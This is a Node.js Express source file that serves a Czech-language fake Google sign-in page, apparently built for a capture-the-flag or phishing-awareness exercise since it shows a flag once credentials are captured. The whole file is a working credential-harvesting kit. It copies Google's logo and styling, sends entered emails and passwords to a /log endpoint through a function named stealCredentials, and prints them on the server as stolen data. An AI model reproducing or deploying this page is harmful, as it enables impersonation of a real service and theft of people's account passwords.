const express = require("express");
const app = express();

app.use(express.json());

app.get("/", (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html lang="cs">
      <head>
        <meta charset="UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
        <title>Sign in – Google accounts</title>
        <link href="https://fonts.googleapis.com/css?family=Roboto" rel="stylesheet">
        <style>
          body {
            font-family: 'Roboto', sans-serif;
            background-color: #f2f2f2;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
          }

          .login-box {
            background: #fff;
            padding: 40px;
            width: 360px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.2);
            text-align: center;
          }

          .login-box img {
            width: 75px;
            margin-bottom: 20px;
          }

          h2 {
            font-weight: normal;
            font-size: 1.2em;
            margin-bottom: 10px;
            color: #202124;
          }

          input {
            width: 100%;
            padding: 12px 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 4px;
            font-size: 14px;
          }

          button {
            width: 100%;
            background-color: #1a73e8;
            color: white;
            padding: 12px;
            border: none;
            border-radius: 4px;
            font-size: 14px;
            cursor: pointer;
            margin-top: 10px;
          }

          button:hover {
            background-color: #1669c1;
          }

          .footer {
            margin-top: 30px;
            font-size: 0.85em;
            color: #777;
          }

          .flag {
            margin-top: 20px;
            font-size: 1em;
            color: green;
            font-weight: bold;
            display: none;
          }
        </style>
      </head>
      <body>
        <div class="login-box">
          <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google logo" />
          <h2>Přihlášení</h2>
          <p>pro pokračování ve vyhledávání</p>
          <form onsubmit="stealCredentials(event)">
            <input type="email" id="email" placeholder="Email nebo telefon" required><br>
            <input type="password" id="password" placeholder="Zadejte heslo" required><br>
            <button type="submit">Pokračovat</button>
          </form>
          <div class="flag" id="flagMsg">✅ Vaše údaje byly úspěšně odcizeny, FLAG(25847)</div>
          <div class="footer">
            Nepoužívate váš počítač? Použij režim host, pro privatní přihlášení.
          </div>
        </div>

        <script>
          function stealCredentials(e) {
            e.preventDefault();
            const email = document.getElementById("email").value;
            const password = document.getElementById("password").value;

            fetch("/log", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ email, password })
            }).then(() => {
              document.getElementById("flagMsg").style.display = "block";
            });
          }
        </script>
      </body>
    </html>
  `);
});

app.post("/log", (req, res) => {
  console.log("📥 Ukradené údaje (Google styl):", req.body);
  res.sendStatus(200);
});

const port = process.env.PORT || 3000;
app.listen(port, () => {
  console.log("Fake Google login phishing page running on port", port);
});